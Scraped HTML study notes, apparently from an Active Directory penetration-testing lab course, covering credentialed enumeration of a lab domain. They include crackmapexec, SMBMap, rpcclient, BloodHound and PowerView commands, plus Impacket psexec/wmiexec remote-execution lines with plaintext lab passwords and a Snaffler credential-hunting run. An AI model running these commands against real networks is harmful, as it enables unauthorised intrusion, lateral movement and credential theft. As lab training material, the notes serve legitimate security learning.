AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.0
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 9/2/2020 11:31:50 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 9/2/2020 11:31:51 AM
AntivirusSignatureVersion       : 1.323.392.0
BehaviorMonitorEnabled          : False
ComputerID                      : 07D23A51-F83F-4651-B9ED-110FF2B83A9C
ComputerState                   : 0
FullScanAge                     : 4294967295</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=using-get-applockerpolicy-cmdlet>Using Get-AppLockerPolicy cmdlet</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa
Name                : Block PowerShell
Description         : Blocks Domain Users from using PowerShell on workstations
UserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513
Action              : Deny

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h2 id=powershell-constrained-language-mode>PowerShell Constrained Language Mode</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; $ExecutionContext.SessionState.LanguageMode

ConstrainedLanguage</code></pre></div><p>Â </p><p>Â </p><h2 id=laps>LAPS</h2><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Find-LAPSDelegatedGroups

OrgUnit                                             Delegated Groups
-------                                             ----------------
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
OU=Contractor La</code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Find-AdmPwdExtendedRights

ComputerName                Identity                    Reason
------------                --------                    ------
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated</code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-LAPSComputers

ComputerName                Password       Expiration
------------                --------       -------</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h1 id=credentialed-enumeration---from-linux>Credentialed Enumeration - from Linux</h1><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\local-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
</span></span><span style=display:flex><span>SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
</span></span><span style=display:flex><span>SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
</span></span><span style=display:flex><span>SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
</span></span><span style=display:flex><span>SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
</span></span><span style=display:flex><span>SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
</span></span><span style=display:flex><span>SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share 
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share &#39;Department Shares&#39;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
</span></span><span style=display:flex><span>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
</span></span><span style=display:flex><span>SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:
</span></span><span style=display:flex><span>SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: [&#39;print$&#39;]
</span></span><span style=display:flex><span>SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: [&#39;ico&#39;, &#39;lnk&#39;]
</span></span><span style=display:flex><span>SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200
</span></span><span style=display:flex><span>SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h2 id=smbmap>SMBMap</h2><h4 id=smbmap-to-check-access>SMBMap To Check Access</h4><p>Credentialed Enumeration - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
</span></span><span style=display:flex><span>        Disk                                                  	Permissions	Comment
</span></span><span style=display:flex><span>    ----                                                  	-----------	-------
</span></span><span style=display:flex><span>    ADMIN$                                            	NO ACCESS	Remote Admin
</span></span><span style=display:flex><span>    C$                                                	NO ACCESS	Default share
</span></span><span style=display:flex><span>    Department Shares                                 	READ ONLY	
</span></span><span style=display:flex><span>    IPC$                                              	READ ONLY	Remote IPC
</span></span><span style=display:flex><span>    NETLOGON                                          	READ ONLY	Logon server share 
</span></span><span style=display:flex><span>    SYSVOL                                            	READ ONLY	Logon server share 
</span></span><span style=display:flex><span>    User Shares                                       	READ ONLY	
</span></span><span style=display:flex><span>    ZZZ_archive                                       	READ ONLY
</span></span></code></pre></div><h4 id=recursive-list-of-all-directories>Recursive List Of All Directories</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#39;Department Shares&#39; --dir-only
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
</span></span><span style=display:flex><span>        Disk                                                  	Permissions	Comment
</span></span><span style=display:flex><span>    ----                                                  	-----------	-------
</span></span><span style=display:flex><span>    Department Shares                                 	READ ONLY
</span></span></code></pre></div><p>Â </p><p>Â </p><h2 id=rpcclient>rpcclient</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rpcclient -U <span style=color:#e6db74>&#34;&#34;</span> -N 172.16.5.5</span></span></code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>rpcclient $&gt; enumdomusers
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>user:[administrator] rid:[0x1f4]
</span></span><span style=display:flex><span>user:[guest] rid:[0x1f5]
</span></span><span style=display:flex><span>user:[krbtgt] rid:[0x1f6]
</span></span><span style=display:flex><span>user:[lab_adm] rid:[0x3e9]
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h2 id=impacket-toolkit>Impacket Toolkit</h2><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>psexec.py inlanefreight.local/wley:<span style=color:#e6db74>&#39;transporter@4&#39;</span>@172.16.5.125</span></span></code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wmiexec.py inlanefreight.local/wley:<span style=color:#e6db74>&#39;transporter@4&#39;</span>@172.16.5.5</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h2 id=bloodhoundpy>Bloodhound.py</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ sudo bloodhound-python -u &#39;forend&#39; -p &#39;Klmcargo2&#39; -ns 172.16.5.5 -d inlanefreight.local -c all 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>INFO: Found AD domain: inlanefreight.local
</span></span><span style=display:flex><span>INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>INFO: Found 1 domains
</span></span><span style=display:flex><span>INFO: Found 2 domains in the forest
</span></span><span style=display:flex><span>INFO: Found 564 computers
</span></span><span style=display:flex><span>INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>INFO: Found 2951 users
</span></span><span style=display:flex><span>INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>INFO: Found 183 groups
</span></span><span style=display:flex><span>INFO: Found 2 trusts
</span></span><span style=display:flex><span>INFO: Starting computer enumeration with 10 workers
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=credentialed-enumeration---from-windows>Credentialed Enumeration - from Windows</h1><p>Â </p><h4 id=load-activedirectory-module>Load ActiveDirectory Module</h4><p>Credentialed Enumeration - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Import-Module ActiveDirectory
PS C:\local&gt; Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline</code></pre></div><p>Â </p><p>Â </p><h4 id=get-aduser>Get-ADUser</h4><p>Credentialed Enumeration - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-ADUser -Filter {ServicePrincipalName -ne &#34;$null&#34;} -Properties ServicePrincipalName

DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Sharepoint
Name                 : adfs</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=checking-for-trust-relationships>Checking For Trust Relationships</h4><p>Credentialed Enumeration - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication</code></pre></div><p>Â </p><p>Â </p><p>User enumeration</p><p><a href=#R-image-a6660553e6a80a18122fafa331ee5c54 class=lightbox-link><img alt=661f46ad8132b7b46208e349bdec806b.png class="lazy lightbox figure-image" loading=lazy src=../../resources/661f46ad8132b7b46208e349bdec806b.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-a6660553e6a80a18122fafa331ee5c54><img alt=661f46ad8132b7b46208e349bdec806b.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/661f46ad8132b7b46208e349bdec806b.png></a></p><p>Â <a href=#R-image-abfaa055ddd375884d1fc2ca1d8466d4 class=lightbox-link><img alt=661ee6940d9f40291a491e45fa99a204.png class="lazy lightbox figure-image" loading=lazy src=../../resources/661ee6940d9f40291a491e45fa99a204.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-abfaa055ddd375884d1fc2ca1d8466d4><img alt=661ee6940d9f40291a491e45fa99a204.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/661ee6940d9f40291a491e45fa99a204.png></a></p><h4 id=detailed-group-info>Detailed Group Info</h4><p>Credentialed Enumeration - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-ADGroup -Identity &#34;Backup Operators&#34;

DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
ObjectClass       : group</code></pre></div><p>Â </p><p>Â </p><h3 id=group-membership>Group Membership</h3><p>Credentialed Enumeration - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-ADGroupMember -Identity &#34;Backup Operators&#34;

distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
name              : BACKUPAGENT
objectClass       : user
objectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName    : backupagent</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h2 id=powerview>PowerView</h2><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>Export-PowerViewCSV</code></td><td>Append results to a CSV file</td></tr><tr><td><code>ConvertTo-SID</code></td><td>Convert a User or group name to its SID value</td></tr><tr><td><code>Get-DomainSPNTicket</code></td><td>Requests the Kerberos ticket for a specified Service Principal Name (SPN) account</td></tr><tr><td><strong>Domain/LDAP Functions:</strong></td><td></td></tr><tr><td><code>Get-Domain</code></td><td>Will return the AD object for the current (or specified) domain</td></tr><tr><td><code>Get-DomainController</code></td><td>Return a list of the Domain Controllers for the specified domain</td></tr><tr><td><code>Get-DomainUser</code></td><td>Will return all users or specific user objects in AD</td></tr><tr><td><code>Get-DomainComputer</code></td><td>Will return all computers or specific computer objects in AD</td></tr><tr><td><code>Get-DomainGroup</code></td><td>Will return all groups or specific group objects in AD</td></tr><tr><td><code>Get-DomainOU</code></td><td>Search for all or specific OU objects in AD</td></tr><tr><td><code>Find-InterestingDomainAcl</code></td><td>Finds object ACLs in the domain with modification rights set to non-built in objects</td></tr><tr><td><code>Get-DomainGroupMember</code></td><td>Will return the members of a specific domain group</td></tr><tr><td><code>Get-DomainFileServer</code></td><td>Returns a list of servers likely functioning as file servers</td></tr><tr><td><code>Get-DomainDFSShare</code></td><td>Returns a list of all distributed file systems for the current (or specified) domain</td></tr><tr><td><strong>GPO Functions:</strong></td><td></td></tr><tr><td><code>Get-DomainGPO</code></td><td>Will return all GPOs or specific GPO objects in AD</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>Returns the default domain policy or the domain controller policy for the current domain</td></tr><tr><td><strong>Computer Enumeration Functions:</strong></td><td></td></tr><tr><td><code>Get-NetLocalGroup</code></td><td>Enumerates local groups on the local or a remote machine</td></tr><tr><td><code>Get-NetLocalGroupMember</code></td><td>Enumerates members of a specific local group</td></tr><tr><td><code>Get-NetShare</code></td><td>Returns open shares on the local (or a remote) machine</td></tr><tr><td><code>Get-NetSession</code></td><td>Will return session information for the local (or a remote) machine</td></tr><tr><td><code>Test-AdminAccess</code></td><td>Tests if the current user has administrative access to the local (or a remote) machine</td></tr><tr><td><strong>Threaded &lsquo;Meta&rsquo;-Functions:</strong></td><td></td></tr><tr><td><code>Find-DomainUserLocation</code></td><td>Finds machines where specific users are logged in</td></tr><tr><td><code>Find-DomainShare</code></td><td>Finds reachable shares on domain machines</td></tr><tr><td><code>Find-InterestingDomainShareFile</code></td><td>Searches for files matching specific criteria on readable shares in the domain</td></tr><tr><td><code>Find-LocalAdminAccess</code></td><td>Find machines on the local domain where the current user has local administrator access</td></tr><tr><td><strong>Domain Trust Functions:</strong></td><td></td></tr><tr><td><code>Get-DomainTrust</code></td><td>Returns domain trusts for the current domain or a specified domain</td></tr><tr><td><code>Get-ForestTrust</code></td><td>Returns all forest trusts for the current forest or a specified forest</td></tr><tr><td><code>Get-DomainForeignUser</code></td><td>Enumerates users who are in groups outside of the user&rsquo;s domain</td></tr><tr><td><code>Get-DomainForeignGroupMember</code></td><td>Enumerates groups with users outside of the group&rsquo;s domain and returns each foreign member</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>Will enumerate all trusts for the current domain and any others seen.</td></tr></tbody></table><p>Â </p><p>Â </p><p><a href=#R-image-656f90b431140aaa97e20b8c22348b60 class=lightbox-link><img alt=53978efe62d738c0c33d14f1f311abb7.png class="lazy lightbox figure-image" loading=lazy src=../../resources/53978efe62d738c0c33d14f1f311abb7.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-656f90b431140aaa97e20b8c22348b60><img alt=53978efe62d738c0c33d14f1f311abb7.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/53978efe62d738c0c33d14f1f311abb7.png></a></p><p>Â </p><p><a href=#R-image-0723afb011fc1e0b12760c895a1841cf class=lightbox-link><img alt=aa9ab96a6e483afd947ec37965b69105.png class="lazy lightbox figure-image" loading=lazy src=../../resources/aa9ab96a6e483afd947ec37965b69105.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-0723afb011fc1e0b12760c895a1841cf><img alt=aa9ab96a6e483afd947ec37965b69105.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/aa9ab96a6e483afd947ec37965b69105.png></a></p><p>Â </p><p>Â </p><p>user membership</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

name                 : Matthew Morgan
samaccountname       : mmorgan
description          :
memberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
whencreated          : 10/27/2021 5:37:06 PM
pwdlastset           : 11/18/2021 10:02:57 AM
lastlogontimestamp   : 2/27/2022 6:34:25 PM
accountexpires       : NEVER
admincount           : 1
userprincipalname    : mmorgan@inlanefreight.local
serviceprincipalname :
mail                 :
useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH</code></pre></div><p>Â </p><p>Â </p><p>Password finder</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

 .::::::.:::.    :::.  :::.    .-:::::&#39;.-:::::&#39;:::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;&#39;&#39;&#39;&#39; ;;;&#39;&#39;&#39;&#39; ;;;    ;;;;&#39;&#39;&#39;&#39; ;;;;``;;;;
&#39;[==/[[[[, [[[[[. &#39;[[ ,[[ &#39;[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[[&#39;
  &#39;&#39;&#39;    $ $$$ &#39;Y$c$$c$$$cc$$$c`$$$&#39;`` `$$$&#39;`` $$&#39;     $$&#34;&#34;   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b &#39;88bo,
  &#39;YMmMY&#39;  MMM     YM YMM   &#39;&#39;` &#39;MM,    &#39;MM,  &#39;&#39;&#39;&#39;YUMMM&#39;&#39;&#39;&#39;YUMMMMMMM   &#39;W&#39;
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler

